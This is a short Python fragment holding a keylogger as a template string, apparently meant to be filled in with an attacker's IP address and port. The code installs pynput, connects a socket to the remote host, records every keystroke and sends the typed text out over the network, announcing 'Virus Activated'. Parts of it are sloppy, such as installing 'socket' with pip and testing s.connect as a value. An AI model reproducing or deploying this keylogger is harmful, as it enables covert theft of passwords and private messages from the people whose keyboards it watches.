code = """ 
try:
    import os 
    os.system("pip install pynput")
    from pynput.keyboard import Key, Listener
    os.system("pip install socket")
    from socket import * 
    
except:
    print("The virus is fucked up")
    input()

os.system("color 0A")
s = socket.socket()
ip = "{}"
port = {}
s.connect((ip,port))

word = ""

if s.connect:
    print("Virus Activated")

def on_press(key):
    global word

    if key == Key.space:
        word += " "

    elif key == Key.shift:
        pass

    elif key == Key.backspace:
        word = word[:-1]

        if len(word) <= 0:
            word = " "

    elif key == Key.enter:
        word += "{}"

    else: 
        word += str(key)[1:2]

    try:
        s.send(word.encode())
    except:
        pass;

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
print("PRESS ENTER")
input()
"""